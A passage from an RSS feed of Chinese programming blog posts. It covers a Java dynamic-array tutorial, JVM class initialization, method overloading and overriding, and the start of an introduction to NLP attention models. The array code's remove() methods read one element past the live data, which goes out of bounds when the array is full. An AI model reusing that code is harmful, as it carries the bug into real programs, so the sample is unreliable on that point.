     * 查找数组中元素e所在的索引
     *
     * @param e
     * @return
     */
    public int find(int e) {
        for (int i = 0; i &amp;lt; size; i++) {
            if (data[i] == e) {
                return i;
            }
        }

        return -1;
    }

    /**
     * 删除索引为index的值
     *
     * @param index
     * @return
     */
    public int remove(int index) {


        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }

        int ret = data[index];

        for (int i = index; i &amp;lt; size; i++) {
            data[i] = data[i + 1];
        }
        size--;
        return ret;
    }

    /**
     * 删除第一个元素
     *
     * @return
     */
    public int removeFirst() {
        return remove(0);
    }

    /**
     * 删除最后一个元素
     *
     * @return
     */
    public int removeLast() {
        return remove(size - 1);
    }

    /**
     * 删除数组中的元素
     *
     * @param e
     */
    public void removeElement(int e) {
        int index = find(e);

        if (index != -1) {
            remove(index);
        }

    }

    @Override
    public String toString() {

        StringBuilder res = new StringBuilder();
        res.append(String.format(&quot;Array: size = %d , capacity = %d\n&quot;, size, data.length));
        res.append(&quot;[&quot;);
        for (int i = 0; i &amp;lt; size; i++) {
            res.append(data[i]);
            if (i != size - 1) {
                res.append(&quot;, &quot;);
            }
        }
        res.append(&quot;]&quot;);
        return res.toString();
    }


}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;修改上面的代码加入泛型&quot;&gt;修改上面的代码，加入泛型&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;注意：这里增加了resize方法，用于扩容，因为底层还是数组实现的，所以当数组的长度不够的时候，需要扩容，这里扩容为原先长度的2倍。ArrayList中为1.5倍&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;/**
 * 使用泛型
 *
 * @author: curry
 * @Date: 2018/8/2
 */
public class Array1&amp;lt;E&amp;gt; {

    private E[] data;

    private int size;

    /**
     * 构造函数。传入数组的容量capacity构造Array
     *
     * @param capacity
     */
    public Array1(int capacity) {
        data = (E[]) new Object[capacity];
        size = 0;
    }

    /**
     * 无参构造函数，默认容量为10
     */
    public Array1() {
        this(10);
    }

    /**
     * 获取数组中的元素个数
     *
     * @return
     */
    public int getSize() {
        return size;
    }

    /**
     * 获取数组容量
     *
     * @return
     */
    public int getCapacity() {
        return data.length;
    }

    /**
     * 返回数组是否为空
     *
     * @return
     */
    public boolean isEmpty() {
        return size == 0;
    }

    /**
     * 向数组最后添加元素
     *
     * @param e
     */
    public void addLast(E e) {
        add(size, e);
    }

    /**
     * 向数组最后增加一个元素
     *
     * @param e
     */
    public void addFirst(E e) {
        add(0, e);
    }

    /**
     * 向index位置增加元素e
     *
     * @param index
     * @param e
     */
    public void add(int index, E e) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt; size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        //判断容量是否超出
        if (size == data.length) {
            resize(2 * data.length);
        }

        //将index后面的值进行后移
        for (int i = size - 1; i &amp;gt;= index; i--) {
            data[i + 1] = data[i];
        }
        //赋值到index 位置
        data[index] = e;

        size++;

    }

    /**
     * 获取index索引位置的值
     *
     * @param index
     * @return
     */
    public E get(int index) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        return data[index];
    }

    public void set(int index, E e) {
        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }
        data[index] = e;
    }

    /**
     * 查找数组中的是否有元素
     *
     * @param e
     * @return
     */
    public boolean contains(E e) {

        for (int i = 0; i &amp;lt; size; i++) {
            if (data[i].equals(e)) {
                return true;
            }
        }

        return false;

    }

    /**
     * 查找数组中元素e所在的索引
     *
     * @param e
     * @return
     */
    public int find(E e) {
        for (int i = 0; i &amp;lt; size; i++) {
            if (data[i].equals(e)) {
                return i;
            }
        }

        return -1;
    }

    /**
     * 删除索引为index的值
     *
     * @param index
     * @return
     */
    public E remove(int index) {


        // 判断index 是否合法
        if (index &amp;lt; 0 || index &amp;gt;= size) {
            throw new IllegalArgumentException(&quot;index is error&quot;);
        }

        E ret = data[index];

        for (int i = index; i &amp;lt; size; i++) {
            data[i] = data[i + 1];
        }

        size--;
        data[size] = null;
        return ret;
    }

    /**
     * 删除第一个元素
     *
     * @return
     */
    public E removeFirst() {
        return remove(0);
    }

    /**
     * 删除最后一个元素
     *
     * @return
     */
    public E removeLast() {
        return remove(size - 1);
    }

    /**
     * 删除数组中的元素
     *
     * @param e
     */
    public void removeElement(E e) {
        int index = find(e);

        if (index != -1) {
            remove(index);
        }

    }

    @Override
    public String toString() {

        StringBuilder res = new StringBuilder();
        res.append(String.format(&quot;Array: size = %d , capacity = %d\n&quot;, size, data.length));
        res.append(&quot;[&quot;);
        for (int i = 0; i &amp;lt; size; i++) {
            res.append(data[i]);
            if (i != size - 1) {
                res.append(&quot;, &quot;);
            }
        }
        res.append(&quot;]&quot;);
        return res.toString();
    }

    /**
     * 扩容
     *
     * @param newCapacity
     */
    private void resize(int newCapacity) {
        E[] newData = (E[]) new Object[newCapacity];

        for (int i = 0; i &amp;lt; data.length; i++) {
            newData[i] = data[i];
        }

        data = newData;
    }


}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实，这里写的动态数组，也是在实现一个简单的ArrayList类。&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 14:43:00 +0000</pubDate>
<dc:creator>阳光温暖</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhenghengbin/p/9434012.html</dc:identifier>
</item>
<item>
<title>从jvm角度看懂类初始化、方法重写、重载。 - 公众号_苦逼的码农</title>
<link>http://www.cnblogs.com/kubidemanong/p/9433758.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kubidemanong/p/9433758.html</guid>
<description>&lt;p&gt;在讲类的初始化之前，我们先来大概了解一下类的声明周期。如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1122091/201808/1122091-20180806220130341-1645732545.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;类的声明周期可以分为7个阶段，但今天我们只讲&lt;strong&gt;初始化&lt;/strong&gt;阶段。我们我觉得出来&lt;strong&gt;使用&lt;/strong&gt;和&lt;strong&gt;卸载&lt;/strong&gt;阶段外，&lt;strong&gt;初始化&lt;/strong&gt;阶段是最贴近我们平时学的，也是笔试做题过程中最容易遇到的，假如你想了解每一个阶段的话，可以看看&lt;strong&gt;深入理解Java虚拟机&lt;/strong&gt;这本书。&lt;/p&gt;
&lt;p&gt;下面开始讲解初始化过程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里需要指出的是，在执行类的初始化之前，其实在&lt;strong&gt;准备&lt;/strong&gt;阶段就已经为&lt;strong&gt;类变量&lt;/strong&gt;分配过内存，并且也已经设置过&lt;strong&gt;类变量&lt;/strong&gt;的初始值了。例如像整数的初始值是0，对象的初始值是null之类的。基本数据类型的初始值如下：&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;数据类型&lt;/th&gt;
&lt;th&gt;初始值&lt;/th&gt;
&lt;th&gt;数据类型&lt;/th&gt;
&lt;th&gt;初始值&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;int&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;boolean&lt;/td&gt;
&lt;td&gt;false&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;long&lt;/td&gt;
&lt;td&gt;0L&lt;/td&gt;
&lt;td&gt;float&lt;/td&gt;
&lt;td&gt;0.0f&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;short&lt;/td&gt;
&lt;td&gt;(short)0&lt;/td&gt;
&lt;td&gt;double&lt;/td&gt;
&lt;td&gt;0.0d&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;char&lt;/td&gt;
&lt;td&gt;‘\u0000’&lt;/td&gt;
&lt;td&gt;reference&lt;/td&gt;
&lt;td&gt;null&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;byte&lt;/td&gt;
&lt;td&gt;(byte)0&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;大家先想一个问题，当我们在运行一个java程序时，每个类都会被初始化吗？假如并非每个类都会执行初始化过程，那什么时候一个类会执行初始化过程呢？&lt;/p&gt;
&lt;p&gt;答案是并非每个类都会执行初始化过程，你想啊，如果这个类根本就不用用到，那初始化它干嘛，占用空间。&lt;/p&gt;
&lt;p&gt;至于何时执行初始化过程，虚拟机规范则是严格规定了&lt;strong&gt;有且只有&lt;/strong&gt;5中情况会马上对类进行&lt;strong&gt;初始化&lt;/strong&gt;。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;当使用&lt;strong&gt;new&lt;/strong&gt;这个关键字实例化对象、读取或者设置一个类的&lt;strong&gt;静态字段&lt;/strong&gt;，以及调用一个类的静态方法时会触发类的初始化(注意，被final修饰的静态字段除外)。&lt;/li&gt;
&lt;li&gt;使用java.lang.reflect包的方法对类进行反射调用时，如果这个类还没有进行过初始化，则会触发该类的初始化。&lt;/li&gt;
&lt;li&gt;当初始化一个类时，如果其父类还没有进行过初始化，则会先触发其父类。&lt;/li&gt;
&lt;li&gt;当虚拟机启动时，用户需要指定一个要执行的主类(包含main()方法的那个类)，虚拟机会先初始化这个主类。&lt;/li&gt;
&lt;li&gt;当使用JDK 1.7的动态语言支持时，如果一个…..(省略，说了也看不懂，哈哈)。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;注意是&lt;strong&gt;有且只有&lt;/strong&gt;。这5种行为我们称为对一个类的&lt;strong&gt;主动引用&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;-&quot;&gt;初始化过程&lt;/h3&gt;
&lt;p&gt;类的初始化过程都干了些什么呢？&lt;/p&gt;
&lt;p&gt;在类的初始化过程中，说白了就是执行了一个&lt;strong&gt;类构造器()方法&lt;/strong&gt;过程。注意，这个clinit并非类的构造函数(init())。&lt;/p&gt;
&lt;p&gt;至于clinit()方法都包含了哪些内容？&lt;/p&gt;
&lt;p&gt;实际上，clinit()方法是由编译器自动收集类中的所有&lt;strong&gt;类变量&lt;/strong&gt;的赋值动作和&lt;strong&gt;静态语句块&lt;/strong&gt;(static{}块)中的语句合并产生的，编译器收集的顺序则是由语句在源文件中出现的顺序来决定的。并且&lt;strong&gt;静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块可以赋值，但不能访问&lt;/strong&gt;。如下面的程序。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-java&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Test1&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; {
        t = &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;;
        System.out.println(t);
    }
    &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; t = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;给大家抛个练习&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Father {
    public static int t1 = 10;
    static {
        t1 = 20;
    }
}
class Son extends Father{
    public static int t2 = t1;
}
//测试调用
class Test2{
    public static void main(String[] args){
        System.out.println(Son.t2);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果是什么呢？&lt;/p&gt;
&lt;p&gt;答案是20。我相信大家都知道为啥。因为会先初始化父类啊。&lt;/p&gt;
&lt;p&gt;不过这里需要注意的是，对于类来说，执行该类的clinit()方法时，会先执行父类的clinit()方法，但对于接口来说，执行接口的clinit()方法并不会执行父接口的clinit()方法。只有当用到父类接口中定义的变量时，才会执行父接口的clinit()方法。&lt;/p&gt;
&lt;h4 id=&quot;-&quot;&gt;被动引用&lt;/h4&gt;
&lt;p&gt;上面说了类初始化的五种情况，我们称之为称之为&lt;strong&gt;主动引用&lt;/strong&gt;。居然存在主动，也意味着存在所谓的&lt;strong&gt;被动&lt;/strong&gt;引用。这里需要提出的是，被动引用并不会触发类的初始化。下面，我们举例几个被动引用的例子：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;通过子类引用父类的静态字段，不会触发子类的初始化&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;/**
 * 1.通过子类引用父类的静态字段，不会触发子类的初始化
 */
public class FatherClass {
    //静态块
    static {
        System.out.println(&quot;FatherClass init&quot;);
    }
    public static int value = 10;
}

class SonClass extends FatherClass {
    static {
        System.out.println(&quot;SonClass init&quot;);
    }
}
 class Test3{
    public static void main(String[] args){
        System.out.println(SonClass.value);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;FatherClass init
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;说明并没有触发子类的初始化&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;通过数组定义来引用类，不会触发此类的初始化。&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt; class Test3{
    public static void main(String[] args){
        SonClass[] sonClass = new SonClass[10];//引用上面的SonClass类。
    }      
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果是啥也没输出。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;引用其他类的&lt;strong&gt;常量&lt;/strong&gt;并不会触发那个类的初始化&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;public class FatherClass {
    //静态块
    static {
        System.out.println(&quot;FatherClass init&quot;);
    }
    public static final String value = &quot;hello&quot;;//常量
}

class Test3{
    public static void main(String[] args){
        System.out.println(FatherClass.value);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果:hello&lt;/p&gt;
&lt;p&gt;实际上，之所以没有输出”FatherClass init”,是因为在编译阶段就已经对这个常量进行了一些优化处理，例如，由于Test3这个类用到了这个常量”hello”，在编译阶段就已经将”hello”这个常量储存到了Test3类的常量池中了，以后对FatherClass.value的引用实际上都被转化为Test3类对自身常量池的引用了。也就是说，在编译成class文件之后，两个class已经没啥毛关系了。&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;对于重载，我想学过java的都懂，但是今天我们中虚拟机的角度来看看重载是怎么回事。&lt;/p&gt;
&lt;p&gt;首先我们先来看一段代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//定义几个类
public abstract class Animal {
}
class Dog extends Animal{
}
class Lion extends Animal{
}

class Test4{
    public void run(Animal animal){
        System.out.println(&quot;动物跑啊跑&quot;);
    }
    public void run(Dog dog){
        System.out.println(&quot;小狗跑啊跑&quot;);
    }
    public void run(Lion lion){
        System.out.println(&quot;狮子跑啊跑&quot;);
    }
    //测试
    public static void main(String[] args){
        Animal dog = new Dog();
        Animal lion = new Lion();;
        Test4 test4 = new Test4();
        test4.run(dog);
        test4.run(lion);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
&lt;p&gt;动物跑啊跑&lt;/p&gt;
&lt;p&gt;动物跑啊跑&lt;/p&gt;
&lt;p&gt;相信大家学过重载的都能猜到是这个结果。但是，为什么会选择这个方法进行重载呢？虚拟机是如何选择的呢？&lt;/p&gt;
&lt;p&gt;在此之前我们先来了解两个概念。&lt;/p&gt;
&lt;p&gt;先来看一行代码：&lt;/p&gt;
&lt;p&gt;Animal dog = new Dog();&lt;/p&gt;
&lt;p&gt;对于这一行代码，我们把Animal称之为变量dog的&lt;strong&gt;静态类型&lt;/strong&gt;，而后面的Dog称为变量dog的&lt;strong&gt;实际类型&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;所谓静态类型也就是说，在代码的编译期就可以判断出来了，也就是说在编译期就可以判断dog的静态类型是啥了。但在编译期无法知道变量dog的&lt;strong&gt;实际类型&lt;/strong&gt;是什么。&lt;/p&gt;
&lt;p&gt;现在我们再来看看虚拟机是根据什么来&lt;strong&gt;重载&lt;/strong&gt;选择哪个方法的。&lt;/p&gt;
&lt;p&gt;对于静态类型相同，但实际类型不同的变量，虚拟机在重载的时候是根据参数的静态类型而不是实际类型作为判断选择的。并且静态类型在编译器就是已知的了，这也代表在编译阶段，就已经决定好了选择哪一个重载方法。&lt;/p&gt;
&lt;p&gt;由于dog和lion的静态类型都是Animal,所以选择了run(Animal animal)这个方法。&lt;/p&gt;
&lt;p&gt;不过需要注意的是，有时候是可以有多个重载版本的，也就是说，重载版本并非是唯一的。我们不妨来看下面的代码。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Test {
    public static void sayHello(Object arg){
        System.out.println(&quot;hello Object&quot;);
    }
    public static void sayHello(int arg){
        System.out.println(&quot;hello int&quot;);
    }
    public static void sayHello(long arg){
        System.out.println(&quot;hello long&quot;);
    }
    public static void sayHello(Character arg){
        System.out.println(&quot;hello Character&quot;);
    }
    public static void sayHello(char arg){
        System.out.println(&quot;hello char&quot;);
    }
    public static void sayHello(char... arg){
        System.out.println(&quot;hello char...&quot;);
    }
    public static void sayHello(Serializable arg){
        System.out.println(&quot;hello Serializable&quot;);
    }

    //测试
    public static void main(String[] args){
        char a = 'a';
        sayHello('a');
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行下代码。&lt;br/&gt;相信大家都知道输出结果是&lt;/p&gt;
&lt;p&gt;hello char&lt;/p&gt;
&lt;p&gt;因为a的静态类型是char,随意会匹配到sayHello(char arg);&lt;/p&gt;
&lt;p&gt;但是，如果我们把sayHello(char arg)这个方法注释掉，再运行下。&lt;/p&gt;
&lt;p&gt;结果输出:&lt;/p&gt;
&lt;p&gt;hello int&lt;/p&gt;
&lt;p&gt;实际上这个时候由于方法中并没有静态类型为char的方法，它就会自动进行类型转换。‘a’除了可以是字符，还可以代表数字97。因此会选择int类型的进行重载。&lt;/p&gt;
&lt;p&gt;我们继续注释掉sayHello(int arg)这个方法。结果会输出：&lt;/p&gt;
&lt;p&gt;hello long。&lt;/p&gt;
&lt;p&gt;这个时候’a’进行两次类型转换，即 ‘a’ -&amp;gt; 97 -&amp;gt; 97L。所以匹配到了sayHell(long arg)方法。&lt;/p&gt;
&lt;p&gt;实际上，’a’会按照char -&amp;gt;int -&amp;gt; long -&amp;gt; float -&amp;gt;double的顺序来转换。但并不会转换成byte或者short，因为从char到byte或者short的转换是不安全的。(为什么不安全？留给你思考下)&lt;/p&gt;
&lt;p&gt;继续注释掉long类型的方法。输出结果是：&lt;/p&gt;
&lt;p&gt;hello Character&lt;/p&gt;
&lt;p&gt;这时发生了一次自动装箱，’a’被封装为Character类型。&lt;/p&gt;
&lt;p&gt;继续注释掉Character类型的方法。输出&lt;/p&gt;
&lt;p&gt;hello Serializable&lt;/p&gt;
&lt;p&gt;为什么？&lt;/p&gt;
&lt;p&gt;一个字符或者数字与序列化有什么关系？实际上，这是因为Serializable是Character类实现的一个接口，当自动装箱之后发现找不到装箱类，但是找到了装箱类实现了的接口类型，所以在一次发生了自动转型。&lt;/p&gt;
&lt;p&gt;我们继续注释掉Serialiable，这个时候的输出结果是：&lt;/p&gt;
&lt;p&gt;hello Object&lt;/p&gt;
&lt;p&gt;这时是’a’装箱后转型为父类了，如果有多个父类，那将从继承关系中从下往上开始搜索，即越接近上层的优先级越低。&lt;/p&gt;
&lt;p&gt;继续注释掉Object方法，这时候输出：&lt;/p&gt;
&lt;p&gt;hello char…&lt;/p&gt;
&lt;p&gt;这个时候’a’被转换为了一个数组元素。&lt;/p&gt;
&lt;p&gt;从上面的例子中，我们可以看出，元素的静态类型并非就是一定是固定的，&lt;strong&gt;它在编译期根根据优先级原则来进行转换。其实这也是java语言实现重载的本质&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我们先来看一段代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//定义几个类
public abstract class Animal {
    public abstract void run();
}
class Dog extends Animal{
    @Override
    public void run() {
        System.out.println(&quot;小狗跑啊跑&quot;);
    }
}
class Lion extends Animal{
    @Override
    public void run() {
        System.out.println(&quot;狮子跑啊跑&quot;);
    }
}
class Test4{
    //测试
    public static void main(String[] args){
        Animal dog = new Dog();
        Animal lion = new Lion();;
        dog.run();
        lion.run();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
&lt;p&gt;小狗跑啊跑&lt;br/&gt;狮子跑啊跑&lt;/p&gt;
&lt;p&gt;我相信大家对这个结果是毫无疑问的。他们的静态类型是一样的，虚拟机是怎么知道要执行哪个方法呢？&lt;/p&gt;
&lt;p&gt;显然，虚拟机是根据&lt;strong&gt;实际类型&lt;/strong&gt;来执行方法的。我们来看看main()方法中的一部分&lt;strong&gt;字节码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//声明：我只是挑出了一部分关键的字节码
public static void (java.lang.String[]);
    Code:
    Stack=2, Locals=3, Args_size=1;//可以不用管这个
    //下面的是关键
    0：new #16;//即new Dog
    3: dup
    4: invokespecial #18; //调用初始化方法
    7: astore_1
    8: new #19 ;即new Lion
    11: dup
    12: invokespecial #21;//调用初始化方法
    15: astore_2

    16: aload_1; 压入栈顶
    17: invokevirtual #22;//调用run()方法
    20: aload_2 ;压入栈顶
    21: invokevirtual #22;//调用run()方法
    24: return
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;解释一下这段字节码：&lt;/p&gt;
&lt;p&gt;0-15行的作用是创建Dog和Lion对象的内存空间，调用Dog,Lion类型的实例构造器。对应的代码:&lt;/p&gt;
&lt;p&gt;Animal dog = new Dog();&lt;/p&gt;
&lt;p&gt;Animal lion = new Lion();&lt;/p&gt;
&lt;p&gt;接下来的16-21句是关键部分，16、20两句分分别把刚刚创建的两个对象的引用压到栈顶。17和21是run()方法的调用指令。&lt;/p&gt;
&lt;p&gt;从指令可以看出，这两条方法的调用指令是完全一样的。可是最终执行的目标方法却并不相同。这是为啥？&lt;/p&gt;
&lt;p&gt;实际上：&lt;/p&gt;
&lt;p&gt;invokevirtual方法调用指令在执行的时候是这样的：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;找到栈顶的第一个元素所指向的对象的实际类型，记作C.&lt;/li&gt;
&lt;li&gt;如果类型C中找到run()这个方法，则进行访问权限的检验，如果可以访问，则方法这个方法的直接引用，查找结束；如果这个方法不可以访问，则抛出java.lang.IllegalAccessEror异常。&lt;/li&gt;
&lt;li&gt;如果在该对象中没有找到run()方法，则按照继承关系从下往上对C的各个父类进行第二步的搜索和检验。&lt;/li&gt;
&lt;li&gt;如果都没有找到，则抛出java.lang.AbstractMethodError异常。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;所以虽然指令的调用是相同的，但17行调用run方法时，此时栈顶存放的对象引用是Dog，21行则是Lion。&lt;/p&gt;
&lt;p&gt;这，就是java语言中方法重写的本质。&lt;/p&gt;
&lt;p&gt;本次的讲解到此结束，希望对你有所帮助。&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 14:03:00 +0000</pubDate>
<dc:creator>公众号_苦逼的码农</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kubidemanong/p/9433758.html</dc:identifier>
</item>
<item>
<title>【NLP】Attention Model（注意力模型）学习总结 - 郭耀华</title>
<link>http://www.cnblogs.com/guoyaohua/p/9429924.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/guoyaohua/p/9429924.html</guid>
<description>&lt;blockquote readability=&quot;15.671875&quot;&gt;
&lt;p&gt;　　最近一直在研究深度语义匹配算法，搭建了个模型，跑起来效果并不是很理想，在分析原因的过程中，发现注意力模型在解决这个问题上还是很有帮助的，所以花了两天研究了一下。&lt;/p&gt;
&lt;p&gt;　　此文大部分参考&lt;a href=&quot;https://blog.csdn.net/malefactor/article/details/78767781&quot;&gt;深度学习中的注意力机制(2017版)&lt;/a&gt; 张俊林的博客，不过添加了一些个人的思考与理解过程。在github上找到一份基于keras框架实现的可运行的注意模型代码：&lt;strong&gt;&lt;a href=&quot;https://github.com/Choco31415/Attention_Network_With_Keras&quot; target=&quot;_blank&quot;&gt;Attention_Network_With_Keras&lt;/a&gt;。如有不足之处，欢迎交流指教。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　注意力模型：对目标数据进行加权变化。人脑的注意力模型，说到底是一种资源分配模型，在某个特定时刻，你的注意力总是集中在画面中的某个焦点部分，而对其它部分视而不见。 ------（思考：为什么要集中在那个部分，是因为那个部分能解决问题吗？）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　最近两年，注意力模型（Attention Model）被广泛使用在自然语言处理、图像识别及语音识别等各种不同类型的深度学习任务中，是深度学习技术中最值得关注与深入了解的核心技术之一。&lt;/p&gt;
&lt;p&gt;　　当我们人在看一样东西的时候，我们当前时刻关注的一定是我们当前正在看的这样东西的某一地方，换句话说，当我们目光移到别处时，注意力随着目光的移动也在转移，这意味着，当人们注意到某个目标或某个场景时，该目标内部以及该场景内每一处空间位置上的注意力分布是不一样的。---------（思考：对于图片，会有些特别显眼的场景会率先吸引住注意力，那是因为脑袋中对这类东西很敏感。对于文本，我们大都是带目的性的去读，顺序查找，顺序读，但是在理解的过程中，我们是根据我们自带的目的去理解，去关注的。 注意力模型应该与具体的目的(或者任务)相结合。）&lt;/p&gt;
&lt;p&gt;　　从Attention的作用角度出发，我们就可以从两个角度来分类Attention种类：&lt;strong&gt;Spatial Attention 空间注意力&lt;/strong&gt;和&lt;strong&gt;Temporal Attention 时间注意力&lt;/strong&gt;。更具实际的应用，也可以将Attention分为&lt;strong&gt;Soft Attention&lt;/strong&gt;和&lt;strong&gt;Hard Attention&lt;/strong&gt;。&lt;span&gt;&lt;strong&gt;Soft Attention是所有的数据都会注意，都会计算出相应的注意力权值，不会设置筛选条件。Hard Attention会在生成注意力权重后筛选掉一部分不符合条件的注意力，让它的注意力权值为0，即可以理解为不再注意这些不符合条件的部分。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　目前绝大多数文献中出现的AM模型是附着在Encoder-Decoder框架下的，当然，其实AM模型可以看作一种通用的思想，本身并不依赖于Encoder-Decoder模型，这点需要注意。&lt;strong&gt;Encoder-Decoder框架可以看作是一种文本处理领域的研究模式&lt;/strong&gt;，应用场景异常广泛，本身就值得细谈。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806135448102-667913176.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图1 抽象的Encoder-Decoder框架&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　Encoder-Decoder框架可以这么直观地去理解：可以把它看作适合处理由一个句子（或篇章）生成另外一个句子（或篇章）的通用处理模型。对于句子对&amp;lt;X,Y&amp;gt;。 --------（思考：&amp;lt;X,Y&amp;gt;对很通用，X是一个问句，Y是答案；X是一个句子，Y是抽取的关系三元组；X是汉语句子，Y是汉语句子的英文翻译。等等），我们的目标是给定输入句子X，期待通过Encoder-Decoder框架来生成目标句子Y。X和Y可以是同一种语言，也可以是两种不同的语言。而X和Y分别由各自的单词序列构成：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806141247005-858346593.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　Encoder顾名思义就是对输入句子X进行编码，将输入句子通过非线性变换转化为中间语义表示C：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806141320980-818442456.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　对于解码器Decoder来说，其任务是根据句子X的中间语义表示C和之前已经生成的历史信息y1,y2….yi-1来生成i时刻要生成的单词yi ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806141350194-1066590310.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　每个yi都依次这么产生，那么看起来就是整个系统根据输入句子X生成了目标句子Y。 ------（思考：其实这里的Encoder-Decoder是一个序列到序列的模型seq2seq，这个模型是对顺序有依赖的。）&lt;/p&gt;
